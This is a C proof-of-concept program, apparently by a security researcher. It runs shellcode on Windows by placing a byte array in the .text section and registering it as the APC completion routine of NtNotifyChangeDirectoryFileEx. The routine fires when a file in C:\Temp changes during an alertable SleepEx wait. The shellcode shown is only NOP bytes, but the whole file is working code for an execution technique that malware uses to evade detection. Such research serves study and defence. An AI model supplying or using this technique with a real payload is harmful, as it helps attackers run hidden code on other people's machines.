#include <windows.h>
#include <winternl.h>
#include <stdio.h>
/*
[*] NtNotifyChangeDirectoryFileEx Shellcode Execution PoC
[*] Author: Osanda Malith Jayathissa - @OsandaMalith
[*] www.osandamalith.com
[*] Date: 12/10/2025
*/
typedef VOID(NTAPI* PIO_APC_ROUTINE)(PVOID, PIO_STATUS_BLOCK, ULONG);

typedef NTSTATUS(NTAPI* NtNotifyChangeDirectoryFileEx_t)(
    HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID, PIO_STATUS_BLOCK,
    PVOID, ULONG, ULONG, BOOLEAN, ULONG
    );

typedef NTSTATUS(NTAPI* NtOpenFile_t)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES,
    PIO_STATUS_BLOCK, ULONG, ULONG
    );

typedef VOID(NTAPI* RtlInitUnicodeString_t)(PUNICODE_STRING, PCWSTR);
typedef NTSTATUS(NTAPI* NtClose_t)(HANDLE);

#pragma section(".text")
__declspec(allocate(".text")) unsigned char shellcode[] = {
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90
};

int main() {
    puts("[*] NtNotifyChangeDirectoryFileEx Shellcode Execution PoC");
    puts("[*] Author: Osanda Malith Jayathissa - @OsandaMalith");
    puts("[*] www.osandamalith.com\n");

    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");

    NtNotifyChangeDirectoryFileEx_t NtNotifyChangeDirectoryFileEx = (NtNotifyChangeDirectoryFileEx_t)GetProcAddress(ntdll, "NtNotifyChangeDirectoryFileEx");
    NtOpenFile_t NtOpenFile = (NtOpenFile_t)GetProcAddress(ntdll, "NtOpenFile");
    RtlInitUnicodeString_t RtlInitUnicodeString = (RtlInitUnicodeString_t)GetProcAddress(ntdll, "RtlInitUnicodeString");
    NtClose_t NtClose = (NtClose_t)GetProcAddress(ntdll, "NtClose");

    UNICODE_STRING path;
    RtlInitUnicodeString(&path, L"\\DosDevices\\C:\\Temp"); 

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &path, OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE hDir;
    IO_STATUS_BLOCK io = { 0 };

    auto status = NtOpenFile(
        &hDir, 
        FILE_LIST_DIRECTORY | SYNCHRONIZE, 
        &oa, 
        &io,
        FILE_SHARE_READ | FILE_SHARE_WRITE, 
        0x00000001
    );

    if (!NT_SUCCESS(status)) {
        printf("[-] NtOpenFile failed: 0x%X\n", status);
        return status;
    }

    BYTE buffer[4096];
    IO_STATUS_BLOCK nio = { 0 };

    status = NtNotifyChangeDirectoryFileEx(
        hDir, 
        NULL, 
        (PIO_APC_ROUTINE)(PVOID)shellcode,
        NULL,
        &nio, 
        buffer, 
        sizeof(buffer), 
        0x00000003, 
        TRUE, 
        3
    );

    if (!NT_SUCCESS(status)) {
        printf("[-] NtNotifyChangeDirectoryFileEx failed: 0x%X\n", status);
        NtClose(hDir);
        return status;
    }

    printf("[+] Shellcode registered as completion routine!\n");
    printf("\n[*] To trigger shellcode:\n");
    printf("[+] Create/delete/rename a file in: %ls\n", path.Buffer);

    // Wait for events
    for (;;) {
        // SleepEx with alertable wait
        DWORD waitResult = SleepEx(100, TRUE);  // TRUE = alertable 
        if (waitResult == WAIT_IO_COMPLETION) {
            printf("[!] Completion routine executed!\n");
        }
    }

    NtClose(hDir);

    return 0;
}
